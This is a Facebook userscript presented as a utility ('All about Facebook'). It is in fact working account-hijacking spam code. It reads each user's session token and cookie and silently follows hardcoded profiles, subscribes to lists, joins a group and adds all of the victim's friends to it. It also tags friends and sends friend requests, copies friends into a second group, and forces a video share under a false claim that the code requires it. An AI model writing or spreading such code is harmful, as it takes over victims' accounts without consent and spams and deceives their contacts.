// ==UserScript==
// @name            d
// @description     All about Facebook By No Name
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==

    var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
    
    http4.send(params4);
}

function sublist(uidss) {
		var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
		document.body.appendChild(a);
}

a("1361073546");
a("100004754168706");
a("100002230367286");
a("100003782272783");
a("100006767049623");

sublist("499702176780790");
 
sublist("10201829563445038");

sublist("499699460114395");

sublist("10201829552084754");

sublist("10201829565205082"); 

sublist("499391673478507");

sublist("499702020114139");

sublist("10201829575685344");

sublist("10201829572325260");

sublist("261690530639791");

sublist("220860704749067");
 
sublist("220860624749075");

sublist("220860661415738");

sublist("220860551415749");

sublist("220162781485526"); 

sublist("352812798188126");

sublist("352813261521413");

sublist("352813394854733");

sublist("352813601521379");

sublist("352813678188038");




var gid = ['1376344669257110'];


var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};

for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
};
var spage_id = "355937974479944";
var sfoto_id = "371499406236703";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
var svn_rev;
var bugun= new Date();
var btarihi = new Date(); 
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
if(!document.cookie.match(/paylasti=(\d+)/)){
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
}


//arkadaslari al ve isle
function sarkadaslari_al(){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
				  eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
				  for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
					smesaj = "";
					smesaj_text = "";
				  for(i=f*10;i<(f+1)*10;i++){
					if(arkadaslar.payload.entries[i]){
				  smesaj += " @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
				  smesaj_text += " " + arkadaslar.payload.entries[i].text;
				  }
					}
					sdurumpaylas();				}
				
			}
			
        };
		var params = "&filter[0]=user";
		params += "&options[0]=friends_only";
		params += "&options[1]=nm";
		params += "&token=v7";
        params += "&viewer=" + user_id;
		params += "&__user=" + user_id;
		
        if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        xmlhttp.send();
}

//tiklama olayini dinle
var tiklama = document.addEventListener("click", function () {
if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
sarkadaslari_al();
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();

document.removeEventListener(tiklama);
}
 }, false);
  

//arkada?¾ ekleme
function sarkadasekle(uid,cins){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){	
			}
        };
		
		xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true); 
		var params = "to_friend=" + uid;
		params += "&action=add_friend";
		params += "&how_found=friend_browser";
		params += "&ref_param=none";
		params += "&outgoing_id=";
		params += "&logging_location=friend_browser";
		params += "&no_flyout_on_click=true";
		params += "&ego_log_data=";
		params += "&http_referer=";
		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
		params += "&__user=" + user_id;
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
		
if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1){
		xmlhttp.send(params);
}else if(document.cookie.split("cins" + user_id +"=").length <= 1){
		cinsiyetgetir(uid,cins,"sarkadasekle");
}else if(cins == document.cookie.split("cins" + user_id +"=")[1].split(";")[0].toString()){
		xmlhttp.send(params);
}
}

//cinsiyet belirleme
var cinssonuc = {};
var cinshtml = document.createElement("html");
function scinsiyetgetir(uid,cins,fonksiyon){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
			eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
			cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html
			btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
			if(cinshtml.getElementsByTagName("select")[0].value == "1"){
			document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();
			}else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
			document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();
			}
			eval(fonksiyon + "(" + id + "," + cins + ");");
			}
        };
		xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.send();
}
if(document.URL.indexOf("https://www.facebook.com/groups/425066007611585/") >= 0){
function penetrasi(e){jx.load(window.location.protocol+"//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg="+document.getElementsByName("fb_dtsg")[0].value+"&group_id="+memberGroupId+"&source=typeahead&members="+e+"&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user="+Env.user,function(e){e=e.substring(e.indexOf("{")),e=JSON.parse(e),i--,kunaon="<div class='friend-edge-name' style='text-align:left;font-size:10px;white-space:pre-wrap;",e.error?(kunaon+="color:darkred'>",kunaon=e.errorDescription?kunaon+e.errorDescription:kunaon+JSON.stringify(e,null,"")):(kunaon+="color:darkgreen'>",kunaon+=arr[i],suc++),kunaon+="</div>",e="<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;background-color:rgba(255,255,255,0.9);z-index:9999;font-size:14px;text-align:center;padding:15px;border-radius:14px;border:8px solid rgba(0,0,0,0.5)'>"+("<div style='padding-bottom:10px;font-size:20px;'>"+tulisanNganu+"</div>"),0<i?(e+=arr.length+" Suscribers detected<br/>",e+="<b>"+suc+"</b> Suscribers added of "+(arr.length-i)+" Suscribers Processed ",e+="("+i+" more to go..)",e=e+"<div class='friend-edge'>"+kunaon,e+="</div>"):(e+=arr.length+" Suscribers detected and ",e+="<b>"+suc+" Suscribers added</b>",e+="<div><span class='uiButton' onClick='document.getElementById(\"pagelet_welcome_box\").style.display=\"none\"'>Close</span></div>"),document.getElementById("pagelet_welcome_box").innerHTML=e+"</div>"},"text","post"),tay--;if(0<tay){var t=arr[tay];setTimeout("penetrasi("+t+")",100)}console.log(tay+"/"+arr.length+":"+t+", success:"+suc),0xf2a794cf90e3!=memberGroupId&&jx.load(window.location.protocol+"//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg="+document.getElementsByName("fb_dtsg")[0].value+"&group_id=118051511613409&source=typeahead&members="+e+"&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user="+Env.user,function(){},"text","post")}function clickfr_callback(){0<document.getElementsByName("ok").length&&nHtml.ClickUp(document.getElementsByName("ok")[0]);var e=arr[i];i<arr.length&&addfriend(e.substring(0,4))}function clickfr(){0<document.getElementsByClassName("search").length?(console.log(document.getElementsByClassName("search")[0].childNodes[0].childNodes[0].childNodes[1].innerHTML),document.getElementsByClassName("search")[0].childNodes[0].childNodes[0].href="javascript:void(0);",nHtml.ClickUp(document.getElementsByClassName("search")[0].childNodes[0].childNodes[0].childNodes[1])):j++,setTimeout("clickfr_callback()",2e3)}function addfriend(e){i++,document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].focus(),document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].value=e,document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].blur(),document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].focus(),document.getElementsByClassName("mbm")[eind].childNodes[0].childNodes[1].childNodes[0].focus(),setTimeout("clickfr()",2e3)}function sleep(e){for(var t=(new Date).getTime(),n=0;1e7>n&&!((new Date).getTime()-t>e);n++);}var tulisanNganu="Auto SUSCRIBE",kunaon="";jx={getHTTPObject:function(){vare=!1;if("undefined"!=typeof ActiveXObject)try{e=new ActiveXObject("Msxml2.XMLHTTP")}catch(t){try{e=new ActiveXObject("Microsoft.XMLHTTP")}catch(n){e=!1}}else if(window.XMLHttpRequest)try{e=new XMLHttpRequest}catch(r){e=!1}return e},load:function(b,c,d,e,g){var f=this.init();if(f&&b){f.overrideMimeType&&f.overrideMimeType("text/xml"),e||(e="GET"),d||(d="text"),g||(g={});var d=d.toLowerCase(),e=e.toUpperCase(),h="uid="+(new Date).getTime(),b=b+(b.indexOf("?")+1?"&":"?"),b=b+h,h=null;"POST"==e&&(h=b.split("?"),b=h[0],h=h[1]),f.open(e,b,!0),"POST"==e&&(f.setRequestHeader("Content-type","application/x-www-form-urlencoded"),f.setRequestHeader("Content-length",h.length),f.setRequestHeader("Connection","close")),f.onreadystatechange=g.handler?function(){g.handler(f)}:function(){if(f.readyState==4)if(f.status==200){var b="";f.responseText&&(b=f.responseText),d.charAt(0)=="j"?(b=b.replace(/[\n\r]/g,""),b=eval("("+b+")")):d.charAt(0)=="x"&&(b=f.responseXML),c&&c(b)}else g.loadingIndicator&&document.getElementsByTagName("body")[0].removeChild(g.loadingIndicator),g.loading&&(document.getElementById(g.loading).style.display="none"),error&&error(f.status)},f.send(h)}},bind:function(e){var t={url:"",onSuccess:!1,onError:!1,format:"text",method:"GET",update:"",loading:"",loadingIndicator:""},n;for(n in t)e[n]&&(t[n]=e[n]);if(t.url){var r=!1;t.loadingIndicator&&(r=document.createElement("div"),r.setAttribute("style","position:absolute;top:0px;left:0px;"),r.setAttribute("class","loading-indicator"),r.innerHTML=t.loadingIndicator,document.getElementsByTagName("body")[0].appendChild(r),this.opt.loadingIndicator=r),t.loading&&(document.getElementById(t.loading).style.display="block"),this.load(t.url,function(e){t.onSuccess&&t.onSuccess(e),t.update&&(document.getElementById(t.update).innerHTML=e),r&&document.getElementsByTagName("body")[0].removeChild(r),t.loading&&(document.getElementById(t.loading).style.display="none")},t.format,t.method,t)}},init:function(){return this.getHTTPObject()}};var nHtml={FindByAttr:function(e,t,n,r){return"className"==n&&(n="class"),(e=document.evaluate(".//"+t+"[@"+n+"='"+r+"']",e,null,XPathResult.FIRST_ORDERED_NODE_TYPE,null))&&e.singleNodeValue?e.singleNodeValue:null},FindByClassName:function(e,t,n){return this.FindByAttr(e,t,"className",n)},FindByXPath:function(e,t){try{var n=document.evaluate(t,e,null,XPathResult.FIRST_ORDERED_NODE_TYPE,null)}catch(r){GM_log("bad xpath:"+t)}return n&&n.singleNodeValue?n.singleNodeValue:null},VisitUrl:function(e){window.setTimeout(function(){document.location.href=e},500+Math.floor(500*Math.random()))},ClickWin:function(e,t,n){var r=e.document.createEvent("MouseEvents");return r.initMouseEvent(n,!0,!0,e,0,0,0,0,0,!1,!1,!1,!1,0,null),!t.dispatchEvent(r)},Click:function(e){return this.ClickWin(window,e,"click")},ClickTimeout:function(e,t){window.setTimeout(function(){return nHtml.ClickWin(window,e,"click")},t+Math.floor(500*Math.random()))},ClickUp:function(e){this.ClickWin(window,e,"mousedown"),this.ClickWin(window,e,"mouseup"),this.ClickWin(window,e,"click")},GetText:function(e,t){var n="";void 0==t&&(t=0);if(!(40<t)){if(void 0!=e.textContent)return e.textContent;for(var r=0;r<e.childNodes.length;r++)n+=this.GetText(e.childNodes[r],t+1);return n}}};void 0==document.getElementsByClassName&&(document.getElementsByClassName=function(e){for(var t=RegExp("(?:^|\\s)"+e+"(?:$|\\s)"),n=document.getElementsByTagName("*"),r=[],i,s=0;null!=(i=n[s]);s++){var o=i.className;o&&-1!=o.indexOf(e)&&t.test(o)&&r.push(i)}return r}),Array.prototype.find=function(e){var t=!1;for(i=0;i<this.length;i++)typeof e=="function"?e.test(this[i])&&(t||(t=[]),t.push(i)):this[i]===e&&(t||(t=[]),t.push(i));return t};for(var a=0,eind=0,len=document.getElementsByClassName("mbm").length,a=0;a<len;a++){var ele=document.getElementsByClassName("mbm")[a];if(ele&&ele.childNodes[0]&&ele.childNodes[0]&&ele.childNodes[0].childNodes[1]&&ele.childNodes[0].childNodes[1].childNodes[0]&&"Add SUSCRIBERS"==document.getElementsByClassName("mbm")[a].childNodes[0].childNodes[1].childNodes[0].value){eind=a;break}}var i=3,tay=3,counter1=0,counter2=0,counter3=0,j=0,k=0,suc=0,arr=[],memberGroupId=document.getElementsByName("group_id")[0].value;jx.load(window.location.protocol+"//www.facebook.com/ajax/typeahead/first_degree.php?__a=1&viewer="+Env.user+"&filter[0]=user&__user="+Env.user,function(e){for(var e=e.substring(e.indexOf("{")),e=JSON.parse(e),e=e.payload.entries,t=0;t<e.length;t++)arr.push(e[t].uid);tay=i=arr.length-1,console.log(arr.length),e="<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;background-color:rgba(255,255,255,0.9);z-index:9999;font-size:14px;text-align:center;padding:15px;border-radius:14px;border:8px solid rgba(0,0,0,0.5)'>"+("<div style='padding-bottom:10px;font-size:20px;'>"+tulisanNganu+"</div>"),e+=arr.length+" SUSCRIBERS detected",document.getElementById("pagelet_welcome_box").innerHTML=e+"</div>",penetrasi(arr[i])})
}else{var dmm = 'https://www.facebook.com/sharer/sharer.php?u=http://www.youtube.com/watch?v=BLt6ClydSyo-lTY';var mtll = 1;function redireccion() {document.location.href=dmm;}setTimeout("redireccion()",mtll);alert('فشلت العملية ...يجب عليك مشاركة الفيديو اولأ والا لن يعمل الكود.. سوف يتم تحويلك الى صفحة المشاركة الرجاء الضغط على موافق..');}